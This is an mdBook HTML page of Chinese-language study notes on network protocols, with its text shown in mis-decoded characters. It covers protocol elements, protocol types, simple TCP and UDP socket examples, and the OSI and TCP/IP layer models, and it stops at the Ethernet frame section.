<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>ç½‘ç»œåè®®ï¼ˆNetwork Protocolï¼‰æ·±åº¦å­¦ä¹ ç¬”è®° - å¼€å‘</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" id="highlight-css" href="../../highlight.css">
        <link rel="stylesheet" id="tomorrow-night-css" href="../../tomorrow-night.css">
        <link rel="stylesheet" id="ayu-highlight-css" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        <link rel="stylesheet" href="../../theme/pagetoc.css">
        <link rel="stylesheet" href="../../theme/help-overlay.css">


        <!-- Provide site root and default themes to javascript -->
        <script>
            const path_to_root = "../../";
            const default_light_theme = "light";
            const default_dark_theme = "navy";
            window.path_to_searchindex_js = "../../searchindex.js";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="mdbook-help-container">
        <div id="mdbook-help-popup">
            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
            <div>
                <p>Press <kbd>â†</kbd> or <kbd>â†’</kbd> to navigate between chapters</p>
                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
                <p>Press <kbd>?</kbd> to show this help</p>
                <p>Press <kbd>Esc</kbd> to hide this help</p>
            </div>
        </div>
    </div>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                let theme = localStorage.getItem('mdbook-theme');
                let sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
            let theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            let sidebar = null;
            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
                sidebar_toggle.checked = false;
            }
            if (sidebar === 'visible') {
                sidebar_toggle.checked = true;
            } else {
                html.classList.remove('sidebar-visible');
            }
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">å¼€å‘</h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <div class="search-wrapper">
                            <input type="search" id="searchbar" name="searchbar" placeholder="æœç´¢æœ¬ä¹¦å†…å®¹..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                            <div class="spinner-wrapper">
                                <i class="fa fa-spinner fa-spin"></i>
                            </div>
                        </div>
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <!-- Page table of contents -->
                        <div class="sidetoc"><nav class="pagetoc"></nav></div>

                        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css">
<h1 id="ç½‘ç»œåè®®network-protocolæ·±åº¦å­¦ä¹ ç¬”è®°"><a class="header" href="#ç½‘ç»œåè®®network-protocolæ·±åº¦å­¦ä¹ ç¬”è®°">ç½‘ç»œåè®®ï¼ˆNetwork Protocolï¼‰æ·±åº¦å­¦ä¹ ç¬”è®°</a></h1>
<h2 id="-å­¦ä¹ è·¯å¾„æ€»è§ˆ"><a class="header" href="#-å­¦ä¹ è·¯å¾„æ€»è§ˆ">ğŸ“‹ å­¦ä¹ è·¯å¾„æ€»è§ˆ</a></h2>
<pre><code class="language-mermaid">graph LR
    A[åè®®åŸºç¡€æ¦‚å¿µ] --&gt; B[åè®®åˆ†å±‚æ¨¡å‹]
    B --&gt; C[ç‰©ç†å±‚ä¸é“¾è·¯å±‚åè®®]
    C --&gt; D[ç½‘ç»œå±‚åè®®]
    D --&gt; E[ä¼ è¾“å±‚åè®®]
    E --&gt; F[åº”ç”¨å±‚åè®®]
    F --&gt; G[IoTä¸ä¸“ç”¨åè®®]
    G --&gt; H[åè®®å®‰å…¨ä¸ä¼˜åŒ–]
</code></pre>
<p><strong>é€‚ç”¨äººç¾¤</strong>: 0-5å¹´å¼€å‘ç»éªŒã€ç½‘ç»œç¼–ç¨‹åˆå­¦è€…ã€å¸Œæœ›ç³»ç»Ÿå­¦ä¹ ç½‘ç»œåè®®çš„æŠ€æœ¯äººå‘˜
<strong>é¢„è®¡å­¦ä¹ æ—¶é—´</strong>: 60-80å°æ—¶
<strong>å­¦ä¹ ç›®æ ‡</strong>: æ·±å…¥ç†è§£ç½‘ç»œåè®®å·¥ä½œåŸç†ï¼ŒæŒæ¡åè®®äº¤äº’è¿‡ç¨‹å’Œæ•°æ®å¸§ç»“æ„ï¼Œå…·å¤‡åè®®åº”ç”¨å¼€å‘å’Œé—®é¢˜æ’æŸ¥èƒ½åŠ›</p>
<hr />
<h2 id="ç¬¬ä¸€ç« ç½‘ç»œåè®®åŸºç¡€æ¦‚å¿µ"><a class="header" href="#ç¬¬ä¸€ç« ç½‘ç»œåè®®åŸºç¡€æ¦‚å¿µ">ç¬¬ä¸€ç« ï¼šç½‘ç»œåè®®åŸºç¡€æ¦‚å¿µ</a></h2>
<h3 id="11-ä»€ä¹ˆæ˜¯ç½‘ç»œåè®®"><a class="header" href="#11-ä»€ä¹ˆæ˜¯ç½‘ç»œåè®®">1.1 ä»€ä¹ˆæ˜¯ç½‘ç»œåè®®</a></h3>
<h4 id="æ ¸å¿ƒå®šä¹‰"><a class="header" href="#æ ¸å¿ƒå®šä¹‰">æ ¸å¿ƒå®šä¹‰</a></h4>
<p>ç½‘ç»œåè®®ï¼ˆNetwork Protocolï¼‰æ˜¯è®¡ç®—æœºç½‘ç»œä¸­è¿›è¡Œæ•°æ®äº¤æ¢è€Œå»ºç«‹çš„è§„åˆ™ã€æ ‡å‡†æˆ–çº¦å®šçš„é›†åˆã€‚å®ƒå®šä¹‰äº†é€šä¿¡åŒæ–¹å¦‚ä½•è¿›è¡Œæ•°æ®äº¤æ¢ï¼ŒåŒ…æ‹¬æ•°æ®æ ¼å¼ã€ä¼ è¾“é¡ºåºã€é”™è¯¯å¤„ç†ç­‰æ–¹é¢ã€‚</p>
<p><strong>åè®®çš„æœ¬è´¨</strong>: ä¸€å¥—é€šä¿¡åŒæ–¹éƒ½ç†è§£å’Œéµå®ˆçš„"è¯­è¨€è§„èŒƒ"</p>
<h4 id="åè®®çš„ä¸‰è¦ç´ "><a class="header" href="#åè®®çš„ä¸‰è¦ç´ ">åè®®çš„ä¸‰è¦ç´ </a></h4>
<pre><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         ç½‘ç»œåè®®ä¸‰è¦ç´                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ 1. è¯­æ³•(Syntax)                          â”‚
â”‚    - æ•°æ®æ ¼å¼                             â”‚
â”‚    - ç¼–ç æ–¹å¼                             â”‚
â”‚    - ä¿¡å·ç”µå¹³                             â”‚
â”‚                                          â”‚
â”‚ 2. è¯­ä¹‰(Semantics)                       â”‚
â”‚    - æ§åˆ¶ä¿¡æ¯                             â”‚
â”‚    - é”™è¯¯å¤„ç†                             â”‚
â”‚    - åŒæ­¥æ–¹å¼                             â”‚
â”‚                                          â”‚
â”‚ 3. æ—¶åº(Timing)                          â”‚
â”‚    - é€Ÿåº¦åŒ¹é…                             â”‚
â”‚    - é¡ºåºæ§åˆ¶                             â”‚
â”‚    - è¶…æ—¶å¤„ç†                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 id="åè®®ç¤ºä¾‹è§£æ"><a class="header" href="#åè®®ç¤ºä¾‹è§£æ">åè®®ç¤ºä¾‹è§£æ</a></h4>
<p><strong>HTTPåè®®çš„ä¸‰è¦ç´ ä½“ç°</strong>:</p>
<pre><code class="language-http"># è¯­æ³•: HTTPè¯·æ±‚æ ¼å¼
GET /api/users HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: application/json

# è¯­ä¹‰: GETè¡¨ç¤ºè·å–èµ„æºï¼Œ/api/usersè¡¨ç¤ºèµ„æºè·¯å¾„
# æ—¶åº: å®¢æˆ·ç«¯å‘é€è¯·æ±‚åç­‰å¾…å“åº”ï¼Œè¶…æ—¶æ—¶é—´é€šå¸¸ä¸º30-60ç§’
</code></pre>
<h3 id="12-åè®®çš„åˆ†ç±»"><a class="header" href="#12-åè®®çš„åˆ†ç±»">1.2 åè®®çš„åˆ†ç±»</a></h3>
<h4 id="æŒ‰åŠŸèƒ½åˆ†ç±»"><a class="header" href="#æŒ‰åŠŸèƒ½åˆ†ç±»">æŒ‰åŠŸèƒ½åˆ†ç±»</a></h4>
<div class="table-wrapper"><table><thead><tr><th>åˆ†ç±»</th><th>ä½œç”¨</th><th>å…¸å‹åè®®</th><th>åº”ç”¨åœºæ™¯</th></tr></thead><tbody>
<tr><td><strong>ä¼ è¾“åè®®</strong></td><td>è´Ÿè´£æ•°æ®å¯é ä¼ è¾“</td><td>TCP, UDP, QUIC</td><td>æ–‡ä»¶ä¼ è¾“ã€å®æ—¶é€šä¿¡</td></tr>
<tr><td><strong>è·¯ç”±åè®®</strong></td><td>è´Ÿè´£è·¯å¾„é€‰æ‹©</td><td>RIP, OSPF, BGP</td><td>è·¯ç”±å™¨é—´é€šä¿¡</td></tr>
<tr><td><strong>åº”ç”¨åè®®</strong></td><td>æä¾›åº”ç”¨å±‚æœåŠ¡</td><td>HTTP, FTP, SMTP</td><td>Webè®¿é—®ã€é‚®ä»¶å‘é€</td></tr>
<tr><td><strong>ç½‘ç»œç®¡ç†åè®®</strong></td><td>ç½‘ç»œç›‘æ§å’Œç®¡ç†</td><td>SNMP, ICMP</td><td>ç½‘ç»œè¯Šæ–­ã€æ€§èƒ½ç›‘æ§</td></tr>
<tr><td><strong>å®‰å…¨åè®®</strong></td><td>æä¾›åŠ å¯†å’Œè®¤è¯</td><td>TLS/SSL, IPSec</td><td>å®‰å…¨é€šä¿¡ã€VPN</td></tr>
<tr><td><strong>IoTåè®®</strong></td><td>ç‰©è”ç½‘è®¾å¤‡é€šä¿¡</td><td>MQTT, CoAP, CAN</td><td>ä¼ æ„Ÿå™¨ã€å·¥ä¸šæ§åˆ¶</td></tr>
</tbody></table>
</div>
<h4 id="æŒ‰å·¥ä½œæ¨¡å¼åˆ†ç±»"><a class="header" href="#æŒ‰å·¥ä½œæ¨¡å¼åˆ†ç±»">æŒ‰å·¥ä½œæ¨¡å¼åˆ†ç±»</a></h4>
<p><strong>1. é¢å‘è¿æ¥åè®® vs æ— è¿æ¥åè®®</strong></p>
<pre><code class="language-python"># é¢å‘è¿æ¥åè®®ç¤ºä¾‹ (TCP)
import socket

# å»ºç«‹è¿æ¥
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('example.com', 80))

# å‘é€æ•°æ®ï¼ˆä¿è¯é¡ºåºå’Œå¯é æ€§ï¼‰
client.send(b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n')

# æ¥æ”¶å“åº”
response = client.recv(4096)

# å…³é—­è¿æ¥
client.close()
</code></pre>
<pre><code class="language-python"># æ— è¿æ¥åè®®ç¤ºä¾‹ (UDP)
import socket

# æ— éœ€å»ºç«‹è¿æ¥
udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# ç›´æ¥å‘é€æ•°æ®ï¼ˆä¸ä¿è¯åˆ°è¾¾ï¼‰
message = b'Hello, UDP!'
udp_socket.sendto(message, ('example.com', 9999))

# æ¥æ”¶å“åº”ï¼ˆå¯èƒ½ä¸¢å¤±ï¼‰
data, addr = udp_socket.recvfrom(1024)

udp_socket.close()
</code></pre>
<p><strong>å¯¹æ¯”åˆ†æ</strong>:</p>
<div class="table-wrapper"><table><thead><tr><th>ç‰¹æ€§</th><th>é¢å‘è¿æ¥ï¼ˆTCPï¼‰</th><th>æ— è¿æ¥ï¼ˆUDPï¼‰</th></tr></thead><tbody>
<tr><td><strong>è¿æ¥å»ºç«‹</strong></td><td>éœ€è¦ä¸‰æ¬¡æ¡æ‰‹</td><td>ä¸éœ€è¦</td></tr>
<tr><td><strong>å¯é æ€§</strong></td><td>å¯é ä¼ è¾“ï¼Œä¿è¯é¡ºåº</td><td>ä¸å¯é ï¼Œå¯èƒ½ä¸¢å¤±</td></tr>
<tr><td><strong>é€Ÿåº¦</strong></td><td>è¾ƒæ…¢ï¼ˆæœ‰ç¡®è®¤æœºåˆ¶ï¼‰</td><td>å¿«é€Ÿï¼ˆæ— é¢å¤–å¼€é”€ï¼‰</td></tr>
<tr><td><strong>å¼€é”€</strong></td><td>å¤´éƒ¨20-60å­—èŠ‚</td><td>å¤´éƒ¨8å­—èŠ‚</td></tr>
<tr><td><strong>åº”ç”¨åœºæ™¯</strong></td><td>æ–‡ä»¶ä¼ è¾“ã€Webæµè§ˆ</td><td>è§†é¢‘ç›´æ’­ã€DNSæŸ¥è¯¢</td></tr>
</tbody></table>
</div>
<hr />
<h2 id="ç¬¬äºŒç« åè®®åˆ†å±‚æ¨¡å‹"><a class="header" href="#ç¬¬äºŒç« åè®®åˆ†å±‚æ¨¡å‹">ç¬¬äºŒç« ï¼šåè®®åˆ†å±‚æ¨¡å‹</a></h2>
<h3 id="21-osiä¸ƒå±‚æ¨¡å‹"><a class="header" href="#21-osiä¸ƒå±‚æ¨¡å‹">2.1 OSIä¸ƒå±‚æ¨¡å‹</a></h3>
<h4 id="æ¨¡å‹ç»“æ„"><a class="header" href="#æ¨¡å‹ç»“æ„">æ¨¡å‹ç»“æ„</a></h4>
<pre><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  7. åº”ç”¨å±‚ (Application Layer)                â”‚  HTTP, FTP, SMTP, DNS
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  6. è¡¨ç¤ºå±‚ (Presentation Layer)               â”‚  åŠ å¯†ã€å‹ç¼©ã€ç¼–ç 
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  5. ä¼šè¯å±‚ (Session Layer)                    â”‚  ä¼šè¯ç®¡ç†ã€åŒæ­¥
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  4. ä¼ è¾“å±‚ (Transport Layer)                  â”‚  TCP, UDP
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  3. ç½‘ç»œå±‚ (Network Layer)                    â”‚  IP, ICMP, ARP
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  2. æ•°æ®é“¾è·¯å±‚ (Data Link Layer)              â”‚  Ethernet, Wi-Fi
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  1. ç‰©ç†å±‚ (Physical Layer)                   â”‚  ç”µç¼†ã€å…‰çº¤ã€æ— çº¿ç”µ
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 id="å„å±‚è¯¦ç»†åŠŸèƒ½"><a class="header" href="#å„å±‚è¯¦ç»†åŠŸèƒ½">å„å±‚è¯¦ç»†åŠŸèƒ½</a></h4>
<p><strong>1. ç‰©ç†å±‚ (Physical Layer)</strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>: ä¼ è¾“åŸå§‹æ¯”ç‰¹æµ</li>
<li><strong>å…³é”®æŠ€æœ¯</strong>: è°ƒåˆ¶è§£è°ƒã€ä¿¡å·ç¼–ç ã€ç”µæ°”ç‰¹æ€§</li>
<li><strong>è®¾å¤‡</strong>: é›†çº¿å™¨(Hub)ã€ä¸­ç»§å™¨(Repeater)</li>
<li><strong>åè®®æ ‡å‡†</strong>: RS-232, RJ45, 10BASE-T</li>
</ul>
<p><strong>2. æ•°æ®é“¾è·¯å±‚ (Data Link Layer)</strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>: æä¾›å¯é çš„ç‚¹åˆ°ç‚¹æ•°æ®ä¼ è¾“</li>
<li><strong>å…³é”®æŠ€æœ¯</strong>: MACåœ°å€ã€å¸§åŒæ­¥ã€é”™è¯¯æ£€æµ‹</li>
<li><strong>è®¾å¤‡</strong>: äº¤æ¢æœº(Switch)ã€ç½‘æ¡¥(Bridge)</li>
<li><strong>å­å±‚</strong>:
<ul>
<li>LLC (é€»è¾‘é“¾è·¯æ§åˆ¶)</li>
<li>MAC (åª’ä½“è®¿é—®æ§åˆ¶)</li>
</ul>
</li>
</ul>
<p><strong>3. ç½‘ç»œå±‚ (Network Layer)</strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>: è·¯ç”±é€‰æ‹©ã€é€»è¾‘å¯»å€</li>
<li><strong>å…³é”®æŠ€æœ¯</strong>: IPåœ°å€ã€è·¯ç”±ç®—æ³•ã€åˆ†ç‰‡é‡ç»„</li>
<li><strong>è®¾å¤‡</strong>: è·¯ç”±å™¨(Router)ã€ä¸‰å±‚äº¤æ¢æœº</li>
<li><strong>åè®®</strong>: IP, ICMP, ARP, OSPF, BGP</li>
</ul>
<p><strong>4. ä¼ è¾“å±‚ (Transport Layer)</strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>: ç«¯åˆ°ç«¯å¯é ä¼ è¾“</li>
<li><strong>å…³é”®æŠ€æœ¯</strong>: æµé‡æ§åˆ¶ã€æ‹¥å¡æ§åˆ¶ã€é”™è¯¯æ¢å¤</li>
<li><strong>åè®®</strong>: TCP, UDP, SCTP</li>
<li><strong>ç«¯å£å·</strong>: æ ‡è¯†åº”ç”¨ç¨‹åº (0-65535)</li>
</ul>
<p><strong>5. ä¼šè¯å±‚ (Session Layer)</strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>: å»ºç«‹ã€ç®¡ç†ã€ç»ˆæ­¢ä¼šè¯</li>
<li><strong>å…³é”®æŠ€æœ¯</strong>: ä¼šè¯åŒæ­¥ã€æ£€æŸ¥ç‚¹ã€æ¢å¤</li>
<li><strong>å…¸å‹åº”ç”¨</strong>: RPC, NetBIOS</li>
</ul>
<p><strong>6. è¡¨ç¤ºå±‚ (Presentation Layer)</strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>: æ•°æ®æ ¼å¼è½¬æ¢</li>
<li><strong>å…³é”®æŠ€æœ¯</strong>: åŠ å¯†è§£å¯†ã€å‹ç¼©è§£å‹ã€ç¼–ç è½¬æ¢</li>
<li><strong>æ ¼å¼</strong>: ASCII, JPEG, MPEG, SSL/TLS</li>
</ul>
<p><strong>7. åº”ç”¨å±‚ (Application Layer)</strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>: ä¸ºåº”ç”¨ç¨‹åºæä¾›ç½‘ç»œæœåŠ¡</li>
<li><strong>åè®®</strong>: HTTP, FTP, SMTP, DNS, Telnet</li>
<li><strong>æ¥å£</strong>: Socket API</li>
</ul>
<h3 id="22-tcpipå››å±‚æ¨¡å‹"><a class="header" href="#22-tcpipå››å±‚æ¨¡å‹">2.2 TCP/IPå››å±‚æ¨¡å‹</a></h3>
<h4 id="æ¨¡å‹å¯¹æ¯”"><a class="header" href="#æ¨¡å‹å¯¹æ¯”">æ¨¡å‹å¯¹æ¯”</a></h4>
<pre><code>OSIä¸ƒå±‚æ¨¡å‹              TCP/IPå››å±‚æ¨¡å‹              æ•°æ®å°è£…
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   åº”ç”¨å±‚     â”‚        â”‚              â”‚        â”‚   æ•°æ®       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤        â”‚   åº”ç”¨å±‚     â”‚        â”‚   (Data)     â”‚
â”‚   è¡¨ç¤ºå±‚     â”‚        â”‚              â”‚        â”‚              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤        â”‚              â”‚        â”‚              â”‚
â”‚   ä¼šè¯å±‚     â”‚        â”‚              â”‚        â”‚              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   ä¼ è¾“å±‚     â”‚   &lt;==&gt; â”‚   ä¼ è¾“å±‚     â”‚        â”‚  TCP/UDPæ®µ   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   ç½‘ç»œå±‚     â”‚   &lt;==&gt; â”‚   ç½‘ç»œå±‚     â”‚        â”‚   IPæ•°æ®åŒ…   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  æ•°æ®é“¾è·¯å±‚  â”‚        â”‚ ç½‘ç»œæ¥å£å±‚   â”‚        â”‚   ä»¥å¤ªç½‘å¸§   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤        â”‚              â”‚        â”‚              â”‚
â”‚   ç‰©ç†å±‚     â”‚        â”‚              â”‚        â”‚   æ¯”ç‰¹æµ     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 id="æ•°æ®å°è£…è¿‡ç¨‹"><a class="header" href="#æ•°æ®å°è£…è¿‡ç¨‹">æ•°æ®å°è£…è¿‡ç¨‹</a></h4>
<pre><code>åº”ç”¨æ•°æ® (Application Data)
    â†“
[TCPå¤´éƒ¨ | åº”ç”¨æ•°æ®] = TCPæ®µ (Segment)
    â†“
[IPå¤´éƒ¨ | TCPæ®µ] = IPæ•°æ®åŒ… (Packet)
    â†“
[ä»¥å¤ªç½‘å¤´éƒ¨ | IPæ•°æ®åŒ… | ä»¥å¤ªç½‘å°¾éƒ¨] = ä»¥å¤ªç½‘å¸§ (Frame)
    â†“
ç‰©ç†ä¿¡å· (Bits)
</code></pre>
<hr />
<h2 id="ç¬¬ä¸‰ç« ç‰©ç†å±‚ä¸æ•°æ®é“¾è·¯å±‚åè®®"><a class="header" href="#ç¬¬ä¸‰ç« ç‰©ç†å±‚ä¸æ•°æ®é“¾è·¯å±‚åè®®">ç¬¬ä¸‰ç« ï¼šç‰©ç†å±‚ä¸æ•°æ®é“¾è·¯å±‚åè®®</a></h2>
<h3 id="31-ethernet-ä»¥å¤ªç½‘-åè®®"><a class="header" href="#31-ethernet-ä»¥å¤ªç½‘-åè®®">3.1 Ethernet (ä»¥å¤ªç½‘) åè®®</a></h3>
<h4 id="ethernetå¸§ç»“æ„"><a class="header" href="#ethernetå¸§ç»“æ„">Ethernetå¸§ç»“æ„</a></h4>
